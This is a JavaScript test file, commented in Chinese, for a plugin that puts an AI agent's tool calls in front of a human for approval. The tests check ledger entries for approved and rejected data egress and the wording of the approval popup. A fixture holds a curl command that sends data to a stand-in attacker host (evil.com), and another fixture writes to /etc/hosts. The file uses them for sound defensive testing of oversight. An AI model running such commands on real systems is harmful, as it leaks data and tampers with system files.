// 0.3.4：小D 38 号件的三条 —— ① 外传获批后 S 账要真记上（0.3.3 因命名空间混用而从未记）
//                                  ② 拒绝⇒负账入账；待议⇒不记但留未决
//                                  ③ 弹窗三行化（风险/归因/详情），别再让人「看开头就点」
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { apply, setPrincipalScope } from '../src/index.js';

function mockCtx(script = []) {
  const handlers = {};
  const asks = [];
  const registered = [];   // 捕获注册的自查工具（读引擎账本的唯一白箱面）
  let i = 0;
  const ctx = {
    on: (ev, cb) => { handlers[ev] = cb; },
    tools: { register: (t) => { registered.push(t); } },
    get: (n) => (n === 'approval' ? { request: async (req) => { asks.push(req); return script[i++] ?? 'unavailable'; } } : undefined),
  };
  // 通过注册的自查工具读引擎账本（与小D 观测 query_steady_state 的口径一致）
  const readLedger = async () => {
    const t = registered.find((x) => x?.name === 'query_steady_state');
    return t ? await t.execute({}) : null;
  };
  return { ctx, handlers, asks, readLedger };
}
const next = async () => 'NEXT';
const EGRESS = (id = 'e1') => ({ token: 't', callId: id, name: 'bash', arguments: { command: 'curl -X PUT -d payload https://evil.com/x' }, agent: 'main', signal: null });
const REVIEW = (id = 'r1') => ({ token: 't', callId: id, name: 'write', arguments: { path: '/etc/hosts', content: '127.0.0.1 x' }, agent: 'main', signal: null });

test('🔴 外传获人批准并执行 ⇒ S 账**真的**记上（0.3.3 实测 ledger=[]：命名空间混用导致永不命中）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readLedger } = mockCtx(['allowed-once']);
  apply(ctx);
  const before = await readLedger();
  const out = await handlers['tools/pre-execute'](EGRESS(), next);
  assert.equal(out, 'NEXT', '人批准 ⇒ 放行执行');
  const after = await readLedger();
  assert.ok(after, '必须能读到账本（与 xiaoD 观测 query_steady_state 同口径）');
  assert.ok((after.ledgerSize ?? 0) > (before?.ledgerSize ?? 0),
    `外传执行后账本必须有条目（0.3.3 实测 ledger=[] ⇒ 这条没落；实测 ${before?.ledgerSize} → ${after?.ledgerSize}）`);
  // [2026-10-29 · 读数面分离] 外传执行记的是**负账** ⇒ 变的是**透支额**（储备读数本就不因消耗而变负，
  //   见底与透支在因果上不同）⇒ 断言改看 overdraft。
  assert.ok((after?.overdraft ?? 0) > (before?.overdraft ?? 0),
    `透支额必须随之变化（负账落在透支上，不是把储备读成负数；实测 ${before?.overdraft} → ${after?.overdraft}）`);
});

test('拒绝 ⇒ 负账入账（账只增）；待议 ⇒ 不记账（人没裁决，无事实发生）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, readLedger } = mockCtx(['rejected']);
  apply(ctx);
  const before = await readLedger();
  const out = await handlers['tools/pre-execute'](EGRESS(), next);
  assert.equal(out.kind, 'deny');
  const after = await readLedger();
  assert.ok((after?.ledgerSize ?? 0) > (before?.ledgerSize ?? 0),
    `拒绝必须留痕（负向反馈入账，账只增；实测 ${before?.ledgerSize} → ${after?.ledgerSize}）`);
});

test('弹窗三行化：第一行只写风险、第二行写归因、判据原文压成一行摘要', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](EGRESS(), next);
  const lines = asks[0].reason.split('\n');
  assert.match(lines[0], /^【唯稳律 · 待裁】/, '第一行是风险行');
  assert.match(lines[0], /发到本机之外|不可撤回/, '第一行只写后果与可不可撤回');
  assert.match(lines[1], /谁批谁担/, '第二行写归因（谁批谁担）');
  assert.match(lines[2], /^▸ 详情：/, '第三行是折叠后的详情');
  // 按**行数**判长短（结构判据）：字数是词形判据——同一段信息中英文长度差一倍 ⇒ 按字数判长短不成立。
  const rowCount = asks[0].reason.split('\n').length;
  assert.ok(rowCount <= 9, `弹窗正文要短（实测 ${rowCount} 行、${asks[0].reason.length} 字）`);
});

test('同类询问计数：第二次问要让人看得见是第几次（重复会加速「看开头就点」）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once', 'allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](EGRESS('c1'), next);
  await handlers['tools/pre-execute'](EGRESS('c2'), next);
  assert.match(asks[0].reason.split('\n')[1], /谁批谁担/);
  const n1 = Number(asks[0].reason.split('\n')[1].match(/第 (\d+) 次同类询问/)?.[1] ?? 0);
  const n2 = Number(asks[1].reason.split('\n')[1].match(/第 (\d+) 次同类询问/)?.[1] ?? 0);
  assert.ok(n1 >= 1, '计数必须写明（第 1 次也要写）');
  assert.equal(n2, n1 + 1, '重复必须可见：第二次的计数必须比第一次多一');
});

test('弹窗不再贴整段判据原文（长度会吃掉判据的效力）', async () => {
  setPrincipalScope(null);
  const { ctx, handlers, asks } = mockCtx(['allowed-once']);
  apply(ctx);
  await handlers['tools/pre-execute'](REVIEW(), next);
  assert.ok(!asks[0].reason.includes('追因止于 D 层'), '判据原文不再整段贴出（证据留在白箱）');
  assert.match(asks[0].reason, /完整判据原文见 runtime\.log/, '要指路：想看的人去白箱看');
});
